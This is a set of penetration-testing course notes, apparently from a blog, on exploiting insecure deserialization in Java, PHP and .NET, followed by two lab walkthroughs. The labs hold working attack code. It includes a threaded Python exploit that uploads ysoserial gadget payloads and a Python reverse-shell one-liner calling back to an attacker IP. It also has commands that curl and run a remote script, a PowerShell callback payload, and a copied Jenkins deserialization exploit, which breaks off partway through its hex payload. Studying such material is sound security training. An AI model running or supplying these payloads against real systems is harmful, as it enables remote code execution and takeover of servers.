---
title: "10 - Attacking Serialization"
classes: single
header:  
  teaser: /assets/images/posts/ewptx/ewptx-teaser11.jpg
  overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Attacking Serialization in Java, PHP and .NET"
description: "Attacking Serialization in Java, PHP and .NET"
categories:
  - notes
  - ewptx
tags:
  - advanced
  - pentest
  - web    
toc: true
---

# Attacking Serialization

- What is Serialization?
- Serialization in Java
- Serialization in PHP
- .NET Serialization
- Other Serialization


By the end of this module, u should have a better understanding of:
  
- Serialization mechanims	
- How to find and exploit untrusted deserialization in common web technologies



## What is Serialization
Serialization is the name of the mechanims that allows us to store the state of programmistic objects in a sequence of bytes in a reversible way. This way, an object (a variable, set of variables, or even a whole class) can be transported remotely to another program.

- The receiving endpoint should be able to recronstruct (deserialize) the received object in an unchanged state.

Used For:
```
→ Storing and transferring data
→ Calling remote procedures (RPC-like methods)
```

* Serialized data itself is not encrypted or signed in any way.
* There might be transport protocols that utilize serialization together with compression and encryption.
* So serialized data might be hidden, secured or encoutered in a plain form.

> Serialized objects are most often encountered in web apps written in PHP, Java and .NET, but serialization is not limited to these languages only.




## Serialization in Java
Install JDK: 
- https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html

Install JRE: 
- https://www.oracle.com/technetwork/java/javase/overview/index.html

- javac = Java commandline compiler

create two files:
```
- item.java # that holds the code For a class names item
- Serialize.java # which contain the serialization logic
```


### Creating Serialized Objects
In order to use serialization, the program must import the **java.io.Serializable** package. Moreover, For the class to be serialized, it must implement a Serializable interface.

![Alt text](/assets/images/posts/ewptx/18.png){: .align-center}

- **item.java** is a class that has two fields: id and name
- in real-life, serializable classes can contain many fields and methods.

So, in another file (in java one class should be contained in one file) that will make use of that class. First, it will create an instance of the item class, and then serialize that instance as well as save it to a file.

![Alt text](/assets/images/posts/ewptx/19.png){: .align-center}

- It converts the instance of the item class to a **Stream of Bytes**
- then its saved to a file caled **data.ser**
- the data.set is in binary format, but we can see some non-ASCII characters 


The file begins with:
```java
'ac ed 00 05' bytes, which is a standard java serialized format signature
```

> When used in web applications, its often encoded using Base64
> The binary value of **ac ed 00 05** equals **rO0AB==**


### Deserializing Data
After compilation and running the Deserialize class, we can see that the object was properly reconstructed

If we change anything from the data.ser file and then try to Deserialize an error occurs
```java
java.lang.ClassNotFoundException: Itxm
```

![Alt text](/assets/images/posts/ewptx/20.png){: .align-center}

### Insecure Deserialization Conditions
When serializing and deserializing data, the deserializing endpoint must know (it must include in its classpath or import) all the classes and packages that the serialized object consists of.

- Basically, attacking java serialization is about passing the malicious state of an object to the deserializing endpoint.

Example: Executing OS commands in java:
```java
Java.lang.Runtime.getRuntime.exec('whoami')
```

Properties and Reflection:
An objects properties in their simplest form are spotted in the formar:
```java
Object.one.two
# two is a property of one
# one is a property of Object
```

```java
Java.lang.Runtime.getRuntime.exe('id')
# method exec('id') is a property of getRuntime
# which is a property of Java.lava.Runtime
```

- During deserialization, the objets properties are accessed recursively, leading to code execution at the very end of this process.

→ Reflection: https://www.oracle.com/technical-resources/articles/java/javareflection.html

> Can be recognized by the **opaque** calling order in the code


> A potentially exploitable condition in Java occurs when **readObject()** or sia similar function is called on user-controlled object and later, a method on that object is called.

An attacker is able to craft an object containing multiple, nested properties, that upon method call will do something completely different

Implementing a Dynamic Proxy:
```
https://www.baeldung.com/java-dynamic-proxies
```

Invocation handler:
```
https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java
```

### Gadgets
Every property or method that is part of a nested exploit object is called a gadget

- gadgets libraries are some java libraries that were identified to contain gadgets used to build serialized exploit objects.

It was first presented as:
```
https://frohoff.github.io/appseccali-marshalling-pickles/
```

Does not mean that gadgets libraries are insecure, it means that an attacker can abuse them to construct a known gadget chain that will result in seccessful exploitation.

There is a tool called **ysoserial** that can be used to perform exploitation of insecure java deserialization vulnerabilties.
```
https://github.com/frohoff/ysoserial
```

## Introduction to Ysoserial
It can be downloaded along with the source code and a precompiled .jar file

- https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

Usage:
```java
java -jar ysoserial.jar //displays the help message
```

Often we need to convert the output to Base64 in order to be able to send it to an application.
```java
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 "whoami"
```

> This command generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonCollections1 in its classpath, will result in executing the command **whoami**


Additions to Ysoserial:

- Several Burpsuite Pro extensions have been developed in order to make java serialization detection and exploitation easier.

Such as:
```java
Freddy, Deserialization Bug Finder:
# https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3

Java Deserialization Scanner:
# https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
```

### brute-Force Attack with Ysoserial
When approaching an application that utilizes serialized java data, we dont know what libraries are used by the backend.

- In this case, brute-force approach might work. We can generate all possible Ysoserial payloads and the try each of them against the target software

![Alt text](/assets/images/posts/ewptx/21.png){: .align-center}

> The script will run and create a Base64-encoded serialized payload For each vulnerable library. The result files can be further used in Burp Intruder Attacks


### Exploring Ysoserial
Each of the *.java* files can be run as a separate java class, resulting in executing different code by the *Ysoserial* tool.

- Its possible to select and invoke a single method out of a jar archive

With the command line java utility: 
```java
-cp (classpath) argument
```

- The classpath contains all locations where the java virtual machine will look For methods available For the process runtime. In that case, we need to specify the Ysoserial .jar file as the classpath.

Inside the the package Ysoserial there is a folder exploit that contains several classes. Each of these classes contain an exploit utility

Example ysoserial/exploit/JSF.java:
```java
java -cp ysoserial.jar ysoserial.exploit.JSF
```

The JSF payload can be used to attack serialization in Java Faces VIEWSTATE parameter. 

> Keep in mind, that we omit the .java extension, which is assumed by default by the java environment.

 
## Exploiting Java Deserialization
→ https://github.com/NickstaDB/DeserLab
```bash
# run the server and client
# open wireshark to sniff the network

# server:
Java -jar DeserLab.jar -server 127.0.0.1 6666

# try to connect with netcat:
nc 127.0.0.1 6666
```
- We can see that the server received our connection

Lets try to connect with the DeserLabs client:
```java
java -jar DeserLab.jar -client 127.0.0.1 6666
```

- In wireshark we can see Java serialized data in the communication
- Save the wireshark dump as deserialization.pcap

### Deciphering Serialized Data
In order to automate revision of all packages sent:
```bash
tshark tool
# it can extracted the serialization stream

# syntax:
tshark -r deserialization.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d',' -f2 | -tr '\n' ':' | sed s/://g
```

For every object/value transported in Java serialized data, there is a predecing byte of certain value that identifies its type

![Alt text](/assets/images/posts/ewptx/22.png){: .align-center}


We can inspect any Java Serialized stream to identify the object it contains using the Java Serialization Dumper tool
```
https://github.com/NickstaDB/SerializationDumper
```

- The tool takes  a hex representation of serialized bytes and dumps the objects the byte stream consists of.

![Alt text](/assets/images/posts/ewptx/23.png){: .align-center}


> The tool dumps every object that is contained with the serialized stream

### Injecting Serialized Payload
We will build a python script that mimic the initial serizalized handshake (0xaced0005) and then replace the serialized data (in this case the string hash with the Ysoserial payload and hope For code execution)

- Based on the output of Serialization Dumper, part of the communication must be mimicked using python; this includes the handshake, two TC_BLOCKDATA structures and the username
- Further down our exploit the hashed string will be replaced with serialized data originating from the Ysoserial tool

In this case the Groovy library is chosen since its utilized by DeserLab.
```java
java -jar ysoserial-master-SNAPSHOT.jar Groovy1 "ping 127.0.0.1" > p.bin
```

The payload contains the java serialization signature in the beginning. Since the serialized conversation is already started, we should remove it from the payload.

![Alt text](/assets/images/posts/ewptx/24.png){: .align-center}

As previously mentioned, it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the Ysoserial payload without its first 4 bytes (aced0005)

Lets now listen to any ICMP packets on the loopback (127.0.0.1) interface while attacking the DeserLab server using our freshly prepared exploit.
```bash
tcpdump -i lo icmp
python serialization.py
```

> The server received the connection and ping was executed


### Analysis of URLDNS Payload
*URLDNS* is a payload from Ysoserial. It does not result in code execution

- Instead, it makes the deserializing endpoint resolve an arbritary DNS name.
- It has low impact, but on the other hand it uses Java built-in features, so its likely to work almost in every case.

```
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
```

We can observe a gadget chain of 4 objects

Gadget Chain:
```java
HashMap.readObject()
  HashMap.putVal()
    HashMap.hash()
      URL.hashCode()
```

*HashMap.readObject()** causes Java to instantiate the deserialized object upon successfull deserialization. The hashmap contains a hashed URL object, which due to java built-in mechanisms, will be arbritraty resolved.

- Its crafted in the public method getObject 
- HashMap is a Java data type that stored data in key-value pairs, its often used in deserialization exploits

First, **SilentURLStreamHandler** is used in order not to resolve the URL upon creation of the serialized object. The **url** variable is the user-supplied url to be resolved.

- line 55, a new HashMap is defined
- then, a data type java.net.URL is assigned to the Hashmap, to key **u**
- next, the hashCode of the URL is calculated. Upon, deserialization, the URL in which the hashCode was calculated will be resolved resulting in arbitrary DNS resolution.

### Arbitrary DNS Resolution Exploit
The payload is generated to the p.bin file, which was previously used to execute ping
```java
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://somethingnonexistent.com > DeserLab/DeserLab-v1.0/p.bin
```

> If u have Burp Suite Pro, u can use the Collaborator Client in order to generate and catch DNS requests

DNSChief will be used as a simple DNS proxy. You can clone it from its GitHub repository:
```
https://github.com/iphelix/dnschef
```

Add to the /etc/resolv.conf
```bash
nameserver 127.0.0.1
```

Start the DNSChief and verify if its working properly by trying to ping a non-existent domain:
```bash
ping oahsdhuasdo.com
```

- Now we can execute the payload (p.bin) and see if the lookup is performed

* URLDNS payloads can be used to detect deserialization issues before you can try to attack them with full-RCE payloads
* Ysoserial payloads that results in code execution rely on similarly nested objects, however, they can be a lot more complicated and involve several objects and their properties


### Troubleshooting Ysoserial
In order to be able to confirm whether the application is secure or not, you shoudl be familiar with the exception types that can be thrown during the attacking process.

- Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface
- When attacking, u should be aware of where the exception comes from. Ysoserial itself prints verbose stack traces when used incorrectly

When reading the stack trace, if u encounter a **ClassNotFoundException**, its likely that the target application does not utilize the gadget library used by the usoserial payload. You can then try to use a different payload that targets another library

- If you encountered **java.io.IOException** with the message *Cannot run program*, this is a good sign because your payload worked. However, the app u wanted to call is unavailable For some reason (example: it doesnt exist)


When telling ysoserial to create an RCE-related payload, you should be aware of its limitations:

- Output redirections and pipes are not supported
- Parameters to the command cannot contain spaces; so, while:
```bash
nc -lp 4444 -e /bin;sh# is ok
python -c import socket;... # will not work because the parameter (import socket) to Python contains a space
```

## Spotting Java Serialized Objects
Pay attention to binary data, especially if its starts with:
```bash
"aced0005" hex
"rO0aB"    base64
looks like a list of java classes (eg "org.apache.somethig", "java.lang.String")
# Presence of such data may indicate that the target application is deserializing custom data.
```

### Recommended Reading
```
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- https://github.com/Coalfire-Research/java-deserialization-exploits
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
- https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
```

## Serialization in PHP
AKA PHP Object Injection

- PHP uses serialize() and unserialize() functions to store, transfer and transform whole objects.
- Unlike Java, PHP Serialization is in non-binary format, looks similar to a JSON array and its human-readable.

looks like:
```bash
0:6:6"Abcdef":1:1{s:9:"Something";s:6:"Active";}
```

For example:
```bash
Booleans are serialized as 'b:<i>;' # where i is 0 or 1 (true/false)

Strings are serialized as 's:<i>:"<s>";' # where is is the string length and s is the string itself

Arrays are serialized as 'a:<i>:{<elements>}' # where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, '<key><value>'

Objects (classes) are serialized as 'O:<i>:"<s>":<i>:{<properties>}' # where the first <i> is an integer representing the string length of <s> and <s> is the fully qualified class name
  ⇒ the second <i> is an integer representing the number of object properties, and <properties> are zero or more serialized name-value pairs
  ⇒ In the <name><value> pair, <name> is a serialized string representing the property name, and <value> is any value that is serializable
  ⇒ Also, <name> is represented as 's:<i>:"<s>";' where <i> is an integer representing the string length of <s>

The visibility of properties influences the value of <s> in the following ways:
  ⇒ With public properties, <s> is the simple name of the property
  ⇒ With protected properties, <s> is the simple name of the property, prepended with \0*\0 - an asterix enclosed in two NULL bytes (0x00)
  ⇒ With private properties, <s> is the simple name of the property, prepended with \0<s>\0 - <s> and enclosed in two NULL bytes, where <s> is the fully qualified class name
```

### Moreover PHP serialized data format
 → http://www.phpinternalsbook.com/php5/classes_objects/serialization.html

 → https://www.geeksforgeeks.org/php-serializing-data/

> You might often encounter the PHP serialized data to be Base64 encoded For transportation purposes. Never leave any Base64 data uninspected.

### Magic Methods
They are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, For example:, **__construct()**

The triggers For the PHP classes are:
```bash
__construct() is loaded upon creating a new instance of a class
__destruct() is loaded when no more references of a current class are present in memory
__wakeUp() is loaded upon deserializing an object
```
Moreover

 → https://www.php.net/manual/en/language.oop5.magic.php

![Alt text](/assets/images/posts/ewptx/25.png){: .align-center}

![Alt text](/assets/images/posts/ewptx/26.png){: .align-center}

First lets create a history.lol file:
```bash
touch history.lol
```

- Lets change the $serialize variable from **history.log** to **history.lol**. As the filename length is the same, we do not need to change the string length information in the serialized data.

> We can observe the destructor function to be run on the history.lol file, which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.


In this example, serialized data was passed in a variable to simplify the example

in the real world, such data often comes from other sources, For example:
```bash
HTTP requests parameters
```

Exploitation of such vuln was possible because:
```bash
- We had access to the source code, so we knew what the script exactly does
- We had access to the original serialized payload, so we knew what to alter in it
- The vuln function was implemented in the default destructor, so the data was used after the deserialization. There could be a case when data is unserialized but not used in an insecure manner.
```

Unserialization logic added to the code:

![Alt text](/assets/images/posts/ewptx/27.png){: .align-center}

Upon deserialization, the class magic methods will be run so that the file will be removed in the destructor function:

![Alt text](/assets/images/posts/ewptx/28.png){: .align-center}



## .NET Serialization
* It uses a few different mechanisms For serialization and de-serialization of data. Data serialized using one of these mechanisms must be de-serialized using the same one.

### .NET Serialization Types
Saving the states of objects using serialization in .NET can be done using various methods:
```bash
- BinaryFormatter
- DataContractSerializer
- NetDataContractSerializer
- XML Serialization
```

BinaryFormatter serialized data to a binary file, and data serialized using XML Serialized is in human-readable, XML format

- Usage of them is situational and connected to .NET internals.
- We are going to see the use of Ysoserial.net, which is similar to the java one.

BinaryFormmater example:
```bash
- The app serialized a string and writes the output to a file
- The file is in binary format, as the name implies
```

After running the application we can inspect the serialized data in the file. Indeed, its in binary format.
```bash
type data.dat
```

* You can expect serialized .NET data encountered in web apps to be Base64 encoded in order to conveniently send non-ASCII characters in HTTP requests and responses.

### Spotting .NET Serialized Data
A common, but not the only place where serialized data can be foudn is when data is sent in a VIEWSTATE parameter, or .NET remoting services.

- .NET remoting services can be considered part of the web application world but they are also part of the infrastructure
- .NET remoting is the mechanics that allow sending pure .NET objects via TCP; however, depending on the application infrastructure, web applications may provide a layer of transport to supply data destined to a .NET remoting endpoint.

Examples of exploiting .NET remoting via HTTP:
 → https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/

 → https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/

### VIEWSTATE
Its a web parameter that is used in the majority of .NET web apps in order to persist the state of the current web page

Viewstate is the state of the page and all its controls. Its automatically maintened across the web app by the ASP.NET framework

- When a page its sent back to the client, the changes in the properties of the page and its controls are determined, and then, they are stored in the value of a hidden input field name __VIEWSTATE
- With every other POST request, the __VIEWSTATE field is sent to the server together with other parameters

### Countermeasures against VIEWSTATE tampering
MAC Enabled option - the viewstate is signed with a cryptographic key known only by the server-side. Its configured by the following setting/option:
```bash
<page enableViewStateMac="true" />
```

- In web.config or **setting MAC validation in IIS manager**, the latest .NET framework uses MAC validation by default
- if the key is hardcoded, it might be leaked as a result of file read vulnerabilities like XXE, File inclusion or similar

Its possible to encrypt the viewstate by configuring the web config:
```bash
<page ViewStateEncryptionMode="Always"/>
```

> this can be done via the IIS management console too



In order to enable the Windows server IIS, go to:
```bash
Control Panel > Programs > Turn windows features on or off
Select Internet Information Services (IIS)

# The files served by the IIS will be present in the standard directory:
c:\inetpub\wwwroot
```

- If u set up the server correctly - restart the pc and go to http://127.0.0.1
- open burp to observe the HTTP traffic


In the wwwroot directory, we will create 3 files:
```bash
- hello.aspx (the frontend logic)
- hello.aspx.cs (backend)
- web.config (the IIS standard config file)
```

![Alt text](/assets/images/posts/ewptx/29.png){: .align-center}

![Alt text](/assets/images/posts/ewptx/30.png){: .align-center}

![Alt text](/assets/images/posts/ewptx/31.png){: .align-center}

The result is a text area, when u click the button the text that u wrote is displayed 

- The web.config file instructs the web server not to require MAC validation of the __VIEWSTATE parameter
- This allow us to tamper with the parameter and the server will try to deserialize it anyway

### Test BURP
Go to the page, click in the button with some text and capture that on BURP

- Send the request to **Repeater** and navigate to **ViewState** tab in Burp
- Burp displays information that MAC is not enabled!

Lets generate a payload using **ysoserial.net** and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads
```bash
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd"
```

We can see that the netcat listener received a request from Windows Powershell:
```bash
nc -lvnp 9000
```

The server response contains the 500 error code; Howeverm powershell is executed. Using the Process Hacker tool we can confirm that indeed IIS spawned the powershell process

> We have achieved RCE via .NET VIEWSTATE deserialization


#### 2nd test - The .cs file was modified

![Alt text](/assets/images/posts/ewptx/32.png){: .align-center}

we can now see in BURP that VIEWSTATE parameter is no longer present in the website requests

- But if we add the viewstate parameter anyway, the code execution still works

![Alt text](/assets/images/posts/ewptx/33.png){: .align-center}


The later is the .NET framework version, the more difficult its to tamper with the viewstate

- If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization only if the MAC key is hardcoded (e.g. web.config)

* The current default setting of IIS are to generate the key at runtime, and its different For each app

Moreover:
```
- https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
```











2nd exercise - Modify the hello.aspx.cs




## Other Serialization
Each dev language has its own deserialization logic and entry points/transportation mechanims of serialized data.

- Less popular languages will result in harder exploitation of deserialization vulns, since no automated tools, like ysoserial will exist
- Deserialization of untrusted data does not necessarily lead to code execution

> You might often be able to view the full code of a target application on github repository


WHen looking FOr this vuln, pay attention to:
```bash
- Contains strings that are similar to method names or object names
- Contains Binary data
- Is in a complex, structured form
```


### Python-based serialization
```
- https://intoli.com/blog/dangerous-pickles/
- https://lincolnloop.com/blog/playing-pickle-security/
```

### Ruby Insecure Deserialization
```
- https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html
```

### Generic presentation about all mentioned technologies
```
- https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf
```

### Examples in Snake YAML
```
- https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
- https://blog.semmle.com/swagger-yaml-parser-vulnerability/
```



## Lab 1

### Task 1. Perform reconnaissance and identify a vulnerable web application

Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.

Step 2: Scan the network with Nmap and gather the information about the target machine.

Use the following command to get the information about open ports and services in the network.

Command:
```bash

nmap demo.ine.local
```



Got the information about the IP address and the ports which are open in the target machine.

Step 3: Use Dirb to list the directories of the website hosted on the server.

```bash
DIRB is a command-line-based tool to brute force any directory based on wordlists.

Command:

dirb http://demo.ine.local/ /usr/share/dirb/wordlists/common.txt
```



Task 2. Identify exploitable conditions

Step 1: Navigate to the target URL.
```bash
Target URL:
http://demo.ine.local/upload/
```



Step 2: Upon entering the page and provide an "index.php?sent=OK" parameter in the end of the URL.

```bash
The application tries to read a file named "data.ser" but throws a Java-related exception.
```

Step 3: Create a sample file with the following command.

Command:
```bash
echo "sample text" > example.txt
```

Step 4: Navigate to the upload page. The upload page allows uploading a file to an unknown location.

> [Note] There is a brief delay before the file is uploaded, which can mean that it is being processed by a kind of back-end logic. Open two tabs on one page with sent=ok at the end and the upload page.

```bash
Select the example.txt and click upload then quickly switch the tabs.
```

Step 5: Upload the file using the upload page and try to read the file.
```bash
- The application moves away from any uploaded files once they are processed. To be able to read them on time, one should click the "Read the file" button before the upload message is displayed.

- Now if the "OK" button at "Read the file" is clicked quickly enough (it is best to have it in a separate tab) then the error message changes indicating, that possibly, the file content was deserialized unsuccessfully due to a corrupted format.

- It looks like we have identified an untrusted data deserialization vulnerability, which can only be exploited when the payload file is timely delivered to the application.
```

Task 3. Achieve code execution

To create an exploit, we will need three things:
```bash
1. Ysoserial payloads to try, as we do not know which exactly will work
2. A loop that will constantly try to upload and then read the file
3. A check to identify whether code execution was achieved or not
```

Step 1: As we have so many payloads in ysoserial tools, we will create a loop with different payloads that will constantly try to upload and then read the file.

To get list of ysoserial payloads, one of the ways can be to copy ysoserial's output to a file, our is called yso.

Command:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar >yso  2>&1
cat yso | tr -d ' ' | cut -d "@" -f 1 > payloads.txt
sed -i -e '1,7d'  payloads.txt
```

This commands will save the payload in the yso file and format it to make a payloads list of ysoserial tool and finally save it as payloads.txt.

Command:
```bash
cat payloads.txt
```

The result will look similar to this.

Step 2: Generate a payload for each line of the aforementioned list.

> [Note] We are going to ping the IP of the attacker machine not the target machine.

Change the directory to home so that we can list all the payloads easily here.

Command:
```bash
cd /home
```

Use the following command to generate payloads.

Command:
```bash
while read payloadname; do java -jar ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname "ping 192.91.247.2 -c 3" > $payloadname; done < payloads.txt
```

The result will look similar.

Step 3: Construct an exploit in Python that will mimic using the website.

It will need to take a list of payloads (we have them by name, we will shortly turn the list into a list of filenames). Moreover, the exploit will need to issue two requests one after the other - the "upload" one and immediately after it the "read file" one.

In the below examples we are using Python 3. Note we are accessing the target machine website so we need to use that IP address.

The "read file" request might look like the one below.
```bash
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")
```

Then, the "upload_file" request can be similar to the below.
```bash
def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
```

Step 4: We will also need a list of all payload files by their name. Since each file is named after the payload, we can use the "yso" file again to generate a list (as we don't want to retype it manually).
```bash
while read payload; do /root/payloads.txt echo \'$payload\', >> /root/p2.txt; done < /root/payloads.txt
```

The result will look similar.

The list can be pasted directly into a Python program (the last comma after the last payload has to be deleted)

To sequentially run them and then use "read file" immediately, we need to implement the concept of threading. If we simply run the two functions above one after the other, readfile() will wait for upload() until it finishes. By this time, the target file will be gone.

Threading will simply start upload() in another thread which will allow readfile() to run without waiting for the response of upload().
```bash
for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile()
  time.sleep(2)
```

Before running the exploit check if you have started a listener to detect pings - e.g. Wireshark or tcpdump.

Command:
```bash
tcpdump -i eth1 icmp
```

Step 5: Copy and paste the code and save it as exploit.py. We can now clear the list in the exploit, so its final shape will be similar to the below.
```bash
import requests
import time
import threading
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")
def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
payloads = [
'CommonsCollections2'
]

for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
```

Step 6: Execute the exploit code by the following command.

Command:
```bash
python exploit.py
```

The result is code execution!

After a short, while seeing different responses for each payload, we can see that when CommonsCollections2 is used, pings start to appear.

Task 4. Obtain a reverse shell

To establish a reverse shell we will need to issue a command or series of commands. Keep in mind that in Java deserialization, you can use spaces in the commands, but you cannot use spaces in the arguments of the commands.

Step 1: Create a shell script to get the reverse shell from the target machine.

Save this code as rev.py in the root directory.

Code:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.46.20.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Step 2: Then let's host the above using Python's SimpleHTTPServer module in the directory where rev is present.

Command:
```python
python -m SimpleHTTServer 8443
```

Step 3: In another terminal window, start a Netcat listener.

Command:
```bash
nc -lvp 443
```

Step 4: Finally, the exploit is changed to generate the respective payloads one after the other.

- Download the reverse shell
- Make it executable
- Start the shell

```bash
payload = 'CommonsCollections2'
commands = [
'"curl http://192.91.247.2:8443/rev.py -O rev.py"',
'"chmod +x rev.py"',
'"./rev.py"'
]

for command in commands:
  os.system("java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar " + payload + " " + command + " > " + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
```

Below you can find the full exploit code.

Save this as exploit.py and execute the file.

Command:
```bash
python exploit.py
```

Code:
```python
import requests
import time
import threading
import os
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")

def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
payload = 'CommonsCollections2'
commands = [
'"curl http://192.91.247.2:8443/rev.py -O rev.py"',
'"chmod +x rev.py"',
'"./rev.py"'
]

for command in commands:
  os.system("java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar " + payload + " " + command + " > " + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2) 
```

> Successfully achieved remote code execution.



## Lab 2

Solution

Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.



Step 2: Scan the network with Nmap and gather the information about the target machine.

Use the following command to get the information about open ports and services in the network.

Command:
```bash
nmap demo.ine.local
```


Got the information about the IP address and the ports which are open in the target machine.

Step 3: Inspect the Jenkins application by navigating to the IP address at port 8080 in the web browser.

Target URL:
```bash
http://192.24.161.3:8080/
```



Step 4: Copy and paste the python exploit code and save it as exploit.py.

Source: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py

Code:
```python
#!/usr/bin/python
# usage: ./jenkins.py host port /path/to/payload
import socket
import sys
import requests
import base64

host = sys.argv[1]
port = sys.argv[2]

# Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get('http://' + host + ':' + port)
cli_port = int(r.headers['X-Jenkins-CLI-Port'])

# Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print('connecting to %s port %s' % server_address)
sock.connect(server_address)

# Send headers
headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
print('sending "%s"' % headers)
sock.send(headers)
data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data
data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

payloadObj = open(sys.argv[3], 'rb').read()
payload_b64 = base64.b64encode(payloadObj)
payload='\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'+payload_b64+'\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x